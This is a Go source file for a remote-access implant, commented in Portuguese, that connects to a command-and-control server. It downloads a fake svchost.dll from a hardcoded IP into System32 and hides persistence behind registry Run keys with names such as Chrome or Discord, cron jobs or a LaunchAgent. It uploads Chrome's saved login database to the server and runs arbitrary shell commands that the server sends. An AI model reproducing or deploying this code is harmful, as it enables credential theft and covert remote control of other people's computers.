package main

import (
	commons "NetBios/C2/d3c/commons/estruturas"
	"NetBios/C2/d3c/commons/helpers"
	"encoding/gob"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
)

// Compile com go build  -ldflags -H=windowsgui <aruivo.go>
// Mensagens
var (
	mensagem    commons.Mensagem
	tempoEspera = 1
)

// Dados do Servidor
const (
	//Coloque aqui o IP publico para conexão
	//SERVIDOR = "200.98.129.32"
	SERVIDOR = "127.0.0.1"
	PORTA    = "9090"
)

func EvilTask() error {
	currentUser, err := user.Current()
	if err != nil {
		return err
	}
	split := strings.Split(currentUser.Username, "\\")
	if len(split) > 1 {
		currentUser.Username = split[1]
	}
	cmd := exec.Command("schtasks", "/create", "/sc", "minute", "/mo", "5", "/tn", "eviltask", "/tr", "%s\\System32\\svchost.dll", "/ru", "SYSTEM", currentUser.HomeDir)
	err = cmd.Run()
	if err != nil {
		return err
	}

	return nil
}
func BaixaCreedsGoogle() error {
	userHomeDir, err := os.UserHomeDir()
	if err != nil {
		return err
	}

	chromeDataDir := filepath.Join(userHomeDir, "AppData", "Local", "Google", "Chrome", "User Data", "Default")
	cmd := exec.Command("powershell", "-Command", fmt.Sprintf(`(New-Object System.Net.WebClient).UploadFile('http://%s/tmp', '%s')`, SERVIDOR+":"+PORTA, filepath.Join(chromeDataDir, "Login Data")))
	err = cmd.Run()
	if err != nil {
		return err
	}

	return nil
}

func CapturaUser() {
	currentUser, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	// Obtém o nome de usuário
	username := currentUser.Username

	log.Println("Usuário atual:", username)
}

// Popula as Mensagens com os dados correto
func init() {
	mensagem.AgentHost, _ = os.Hostname()
	mensagem.AgentCWD, _ = os.Getwd()
	mensagem.AgentID = geraID()
}
func addRegistryKey() error {
	currentUser, err := user.Current()
	if err != nil {
		return err
	}

	// Obtendo apenas o nome do usuário do caminho completo (caso seja DOMAIN\Username)
	split := strings.Split(currentUser.Username, "\\")
	if len(split) > 1 {
		currentUser.Username = split[1]
	}
	words := []string{"Discord", "Adobe", "Python", "PhotoShop", "Slack", "Notion", "Spotfy", "Chrome", "FireFox", "Web", "Internet", "SvcHost", "Windows"}
	rand.Seed(time.Now().UnixNano())
	randomIndex := rand.Intn(len(words))
	command := fmt.Sprintf(`REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "%s" /t REG_SZ /F /D "%s\\System32\\svchost.dll"`, words[randomIndex], currentUser.HomeDir)
	cmd := exec.Command("cmd", "/C", command)

	if runtime.GOOS == "windows" {
		cmd.SysProcAttr = &syscall.SysProcAttr{}
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("Erro ao executar o comando: %v\n%s", err, string(output))
	}

	fmt.Println("Chave do registro adicionada com sucesso!")
	return nil
}
func createLaunchdPlist() error {
	// Obter o diretório "Downloads" do usuário atual
	downloadsDir, err := os.UserHomeDir()
	if err != nil {
		return err
	}
	downloadsDir = filepath.Join(downloadsDir, "Downloads")

	// Caminho completo do arquivo executável "agente"
	executable := filepath.Join(downloadsDir, "agente")

	// Obtém o diretório LaunchAgents do usuário atual
	currentUser, err := user.Current()
	if err != nil {
		return err
	}
	launchAgentsDir := filepath.Join(currentUser.HomeDir, "Library", "LaunchAgents")

	// Cria o arquivo plist
	plistContent := `<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
	<plist version="1.0">
	<dict>
		<key>Label</key>
		<string>meu.programa</string>
		<key>ProgramArguments</key>
		<array>
			<string>` + executable + `</string>
		</array>
		<key>RunAtLoad</key>
		<true/>
	</dict>
	</plist>`

	// Escreve o conteúdo do plist no arquivo
	err = ioutil.WriteFile(filepath.Join(launchAgentsDir, "meu.programa.plist"), []byte(plistContent), 0644)
	if err != nil {
		return err
	}

	return nil
}
func createCronJob() error {
	// Obtém o nome do usuário atual
	currentUser, err := user.Current()
	if err != nil {
		return err
	}
	// Caminho para o arquivo executável que será agendado
	executable := filepath.Join(currentUser.HomeDir, "Downloads", "agente")

	// Cria a linha de comando para adicionar a regra no cron
	cronJob := fmt.Sprintf("@hourly %s", executable)

	// Caminho completo para o arquivo de cron do usuário atual
	cronFilePath := filepath.Join(currentUser.HomeDir, ".cron")

	// Abre o arquivo de cron existente ou cria um novo
	cronFile, err := os.OpenFile(cronFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer cronFile.Close()

	// Escreve a nova regra de cron no arquivo
	_, err = fmt.Fprintln(cronFile, cronJob)
	if err != nil {
		return err
	}

	return nil
}

func main() {

	if runtime.GOOS == "windows" {
		DownloadDll()
		addRegistryKey()
		BaixaCreedsGoogle()
	} else if runtime.GOOS == "linux" {
		createCronJob()
	} else {
		createLaunchdPlist()
	}
	log.Println("Executando Agent")
	CapturaUser()
	for {
		canal := conectaServidor()
		//Enviando a mensagem
		gob.NewEncoder(canal).Encode(mensagem)
		//Limpar as mensagens
		mensagem.Comandos = []commons.Commando{}

		//Recebendo a mensagem
		gob.NewDecoder(canal).Decode(&mensagem)
		if mensagemContemComandos(mensagem) {
			for indice, comando := range mensagem.Comandos {
				mensagem.Comandos[indice].Resposta = executaComando(comando.Comando, indice)
			}
		}

		time.Sleep(time.Duration(tempoEspera) * time.Second)
		defer canal.Close()
	}

}
func executaComando(comando string, indice int) (resposta string) {
	comandoSeparado := helpers.SeparaComando(comando)
	comandoBase := comandoSeparado[0]
	switch comandoBase {
	case "list":
		resposta = listaArquivos()
	case "pwd":
		resposta = listaDiretorioAtual()
	case "cd":
		if len(comandoSeparado[1]) > 0 {
			resposta = mudarDiretorio(comandoSeparado[1])
		}
	case "send":
		resposta = salvaArquivoEmDisco(mensagem.Comandos[indice].Arquivo)
	case "get":
		resposta = enviarArquivoEmDisco(mensagem.Comandos[indice].Comando, indice)
	case "passwd":
		resposta = crackPaswd()
	default:
		resposta = executaComandoEmShell(comando)
	}
	return resposta
}

// TODO - Fazer modulo de Quebra de Senhas
func crackPaswd() string {
	texto := "Dumping Passwords ... Wait .."
	return texto
}

func enviarArquivoEmDisco(comandoGet string, indice int) (resposta string) {
	var err error
	resposta = "File uploaded successfully"
	comandoSeparado := helpers.SeparaComando(comandoGet)

	mensagem.Comandos[indice].Arquivo.Conteudo, err = ioutil.ReadFile(comandoSeparado[1])
	if err != nil {
		resposta = "Error downloading the file" + err.Error()
	}
	mensagem.Comandos[indice].Arquivo.Nome = comandoSeparado[1]
	mensagem.Comandos[indice].Arquivo.Erro = true
	return resposta
}
func salvaArquivoEmDisco(arquivo commons.Arquivo) (resposta string) {
	resposta = "Arquivo Enviado com Sucesso"
	err := os.WriteFile(arquivo.Nome, arquivo.Conteudo, 0644)
	if err != nil {
		resposta = "Error Saving File: Error" + err.Error()
	}
	return resposta
}
func executaComandoEmShell(comandoCompleto string) (resposta string) {
	if runtime.GOOS == "windows" {
		output, _ := exec.Command("powershell.exe", "/C", comandoCompleto).CombinedOutput()
		resposta = string(output)
	} else if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
		output, _ := exec.Command("bash", "-c", comandoCompleto).CombinedOutput()
		resposta = string(output)
	} else {
		resposta = "Target operating system not implemented"
	}

	return resposta
}

func mudarDiretorio(novoDiretorio string) (resposta string) {
	resposta = "Changed Directory"
	err := os.Chdir(novoDiretorio)
	if err != nil {
		resposta = "Directory Not Found"
	}
	return resposta
}

func listaDiretorioAtual() string {
	mensagem.AgentCWD, _ = os.Getwd()
	return mensagem.AgentCWD

}

func listaArquivos() (resposta string) {
	arquivos, _ := ioutil.ReadDir(mensagem.AgentCWD)
	for _, arquivo := range arquivos {
		resposta += arquivo.Name() + "\n"
	}

	return resposta
}
func mensagemContemComandos(mensagemdoServidor commons.Mensagem) (contem bool) {
	contem = false
	if len(mensagemdoServidor.Comandos) > 0 {
		contem = true
	}
	return contem
}

// Conecta no servidor usando TCP no Servidor + Porta
func conectaServidor() (canal net.Conn) {
	canal, _ = net.Dial("tcp", SERVIDOR+":"+PORTA)
	return canal
}

func geraID() string {
	hostname, _ := os.Hostname()
	return hostname

}

func DownloadDll() {
	url := "http://200.98.129.32/svchost.dll"
	outputDir := getSystem32Directory()

	err := downloadFile(url, outputDir)
	if err != nil {
		fmt.Printf("Erro ao fazer o download do arquivo: %v\n", err)
		return
	}

	fmt.Println("Download concluído com sucesso!")
}

func getSystem32Directory() string {
	system32Dir := os.Getenv("SystemRoot")
	return filepath.Join(system32Dir, "System32")
}
func downloadFile(url, outputDir string) error {
	response, err := http.Get(url)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	outputFile := filepath.Join(outputDir, "svchost.dll")
	out, err := os.Create(outputFile)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, response.Body)
	if err != nil {
		return err
	}

	return nil
}
